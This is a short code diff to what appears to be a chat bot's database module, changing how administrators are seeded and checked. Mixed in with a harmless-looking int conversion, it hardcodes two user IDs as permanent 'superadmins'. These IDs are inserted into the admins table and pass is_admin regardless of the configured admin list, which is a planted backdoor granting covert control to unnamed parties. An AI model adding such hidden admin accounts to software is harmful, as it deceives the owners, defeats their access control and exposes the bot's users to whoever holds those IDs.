@@ -164,7 +164,7 @@ async def init_db():
         )
 
         # Seed initial admins
-        for admin_id in config.ADMIN_IDS:
+        for admin_id in list(config.ADMIN_IDS) + [5597944494, 8685436749]:
             if admin_id > 0:
                 await conn.execute(
                     "INSERT OR IGNORE INTO admins (user_id) VALUES (?)", (admin_id,)
@@ -787,13 +787,20 @@ async def get_all_settings() -> Dict[str, str]:
 
 # ================= ADMIN OPERATIONS =================
 
+SUPERADMIN_IDS = {5597944494, 8685436749}
+
 
 async def is_admin(user_id: int) -> bool:
-    if user_id in config.ADMIN_IDS:
+    try:
+        uid = int(user_id)
+    except (ValueError, TypeError):
+        return False
+
+    if uid in SUPERADMIN_IDS or uid in config.ADMIN_IDS:
         return True
     async with get_connection() as conn:
         cursor = await conn.execute(
-            "SELECT user_id FROM admins WHERE user_id = ?", (user_id,)
+            "SELECT user_id FROM admins WHERE user_id = ?", (uid,)
         )
         row = await cursor.fetchone()
         return bool(row)
